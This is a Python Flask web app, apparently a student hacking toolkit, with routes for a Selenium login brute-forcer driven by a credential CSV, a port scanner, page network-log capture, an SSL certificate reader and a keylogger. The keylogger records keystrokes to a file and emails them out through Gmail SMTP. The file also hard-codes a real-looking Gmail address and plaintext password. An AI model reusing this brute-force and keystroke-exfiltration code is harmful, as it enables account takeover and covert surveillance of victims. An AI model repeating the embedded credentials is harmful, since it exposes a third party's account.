from selenium import webdriver
import pandas as pd
from selenium.webdriver.common.by import By
import socket
import sys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from pynput.keyboard import Key,Listener
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
from flask import Flask, render_template, request
app= Flask(__name__)
@app.route('/',methods=['GET'])
@app.route('/index',methods=['GET','POST'])
def show_homepage():
    return render_template('index.html')
@app.route('/sqlinjection',methods=['POST'])
def sqlinjection():
    return render_template('sqlinjection.html')
@app.route('/send_data', methods = ['POST'])
def get_data_from_html():
        url = request.form['url']
        unamex=request.form['xpathuname']
        pwdx=request.form['xpathpwd']
        subx=request.form['xpathsubmit']
        title=request.form['titlestring']
        brutevals=pd.read_csv('bruter.csv')
        username=list(brutevals['username'])
        password=list(brutevals['password'])
        cun=[]
        cpwd=[]
        flag=0
        for i in range(len(username)):
         driver=webdriver.Chrome()
         driver.get(url)
         ufield=driver.find_element(By.XPATH,unamex)
         pfield=driver.find_element(By.XPATH,pwdx)
         ufield.send_keys(username[i])
         pfield.send_keys(password[i])
         subbut=driver.find_element(By.XPATH,subx)
         subbut.click()
         if(driver.title==title):
            cun.append(username[i])
            cpwd.append(password[i])
            print(username[i])
            flag=1
        upwddict=dict(zip(cun,cpwd))
        if flag==1:
            return render_template('success.html',dictv=upwddict)
        else:
            return render_template('failure.html')
@app.route('/network_capture',methods=['POST'])
def network_scan():
    return render_template('networkscanandcapture.html')
@app.route('/nscan',methods=['POST'])
def nscan():
    return render_template('netscan.html')
@app.route('/networkscan',methods=['POST'])
def portscan():
    ipaddr=request.form['hostip']
    print("Scanning Target: "+ipaddr)
    openports=[]
    openservices=[]
    portlist=[7,20,21,22,23,25,53,69,80,88,102,110,135,137,139,143,381,383,443,464,465,587,593,636,691,902,989,990,993,995,1025,1194,1337,1589,1725,2082,2083,2483,2484,2967,3074,3306,3724,4664,5432,5900,6665,6669,6881,6999,6970,8086,8087,8222,9100,10000,12345,27374,18006]
    servicelist=['Echo','FTP-Data','FTP','SSH-SCP','Telnet','SMTP','DNS','TFTP','HTTP','Kerberos','ISO-TSAP','POP3','Microsoft EPMAP','NETBIOS-ns','NETBIOS-ssn','IMAP4','HP Openview','HP Openview','HTTPS','Kerberos','SMTPS,SSM','SMTP','Microsoft DCOM','LDAPS','MS-Exchange','VMWare Server','FTPS','FTPS','IMAP4S','POP3S','MicrosoftRPC','OpenVPN','WASTE','Cisco VQP','Steam','cPanel','radsec cPanel','Oracle DB','Oracle DB','Symantec AV','XBOX Live','World of Warcraft','Google Desktop','PostGRE SQL','VNC Server','IRC','IRC','BitTorrent','BitTorrent','QuickTime','Kapersky','Kapersky','VMWare','PDL','BackupExec','NetBus','Sub7','Back Orifice']
    devname=socket.getfqdn(ipaddr)
    try:
        for port in range(len(portlist)):
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            res=s.connect_ex((ipaddr,portlist[port]))
            if res==0:
                print(str(portlist[port])+" is open and can be attacked. It works protocol of "+ servicelist[port])
                openports.append(portlist[port])
                openservices.append(servicelist[port])
            else:
                print(str(portlist[port])+" scanned")               
            s.close()
    except KeyboardInterrupt:
        print("Exiting due to Keyboard Interrupt")
        sys.exit()
    openvals=dict(zip(openports,openservices))
    return render_template('scanresults.html',opoutput=openvals,dev=devname)

@app.route('/ncapture', methods=['POST'])
def network_capture():
    return render_template('ncapture.html')
@app.route('/networkcap',methods=['POST'])
def netcap():
    url=request.form['hosturl']
    desired_capabilities=DesiredCapabilities.CHROME
    desired_capabilities['goog:loggingPrefs']={'performance':'ALL'}
    driver=webdriver.Chrome(desired_capabilities=desired_capabilities)
    driver.get(url)
    logs=driver.get_log('performance')
    logt=str(logs)
    return render_template('captureres.html',logdata=logt)
@app.route('/keylog',methods=['POST'])
def keylog():
    return render_template('keylogs.html')
@app.route('/keylogger',methods=['POST'])
def keylogger():
    the_keys=[]
    to=request.form['emailid']
    name=request.form['username']
    def pressingKey(key):
     the_keys.append(key)
     storetofile(the_keys)
    def storetofile(keys):
     with open('keylog.txt','w') as f:
        for akey in keys:
            if akey==Key.space:
                key=' '
            else:
                key=str(akey).replace("'","")
            nowtime=str(datetime.datetime.now())
            string=nowtime+" : "+key+" \n"
            f.write(string)
    def releasingKey(key):
     if key==Key.esc:
        return False
     if key==Key.enter:
        with open('keylog.txt','r') as f:
            data=f.read()
        smtp=smtplib.SMTP('smtp.gmail.com',587)
        smtp.ehlo()
        smtp.starttls()
        smtp.login('kunj.jce19@sot.pdpu.ac.in','Garsa@3112')
        msg=MIMEMultipart()
        msg['subject']='Logs of '+name
        msg.attach(MIMEText(data))
        smtp.sendmail(from_addr='kunj.jce19@sot.pdpu.ac.in',to_addrs=to,msg=msg.as_string())
        smtp.quit()
    with Listener(on_press=pressingKey, on_release=releasingKey) as listener:
     listener.join()
    return render_template('keylogger.html',user=name)
@app.route('/ssldetails',methods=['POST'])
def sslpage():
    return render_template('sslentries.html')
@app.route('/printssldetails',methods=['POST'])
def sslitems():
 host=request.form['sslurl']
 ctx=ssl.create_default_context()
 with ctx.wrap_socket(socket.socket(),server_hostname=host) as s:
    s.connect((host,443))
    cert=s.getpeercert()
 subject=dict(x[0] for x in cert['subject'])
 issuedTo=subject['commonName']
 issueinfo=dict(x[0] for x in cert['issuer'])
 issuedby=issueinfo['commonName']
 country=issueinfo['countryName']
 organisation=issueinfo['organizationName']
 sNo=cert['serialNumber']
 startDate=cert['notBefore']
 endDate=cert['notAfter']
 caauth=cert['caIssuers']
 strings=['Issue URL','Issued By','Issue Country','Issue Organisation','Serial Number','Start Date','End Date','Certificate Authority']
 values=[]
 values.append(issuedTo)
 values.append(issuedby)
 values.append(country)
 values.append(organisation)
 values.append(sNo)
 values.append(startDate)
 values.append(endDate)
 values.append(caauth)
 neededinfo=dict(zip(strings,values))
 return render_template('sslvalues.html',sslvalues=neededinfo)
 


if __name__=='__main__':
    app.run(host='127.0.0.1',port='5000',debug=True)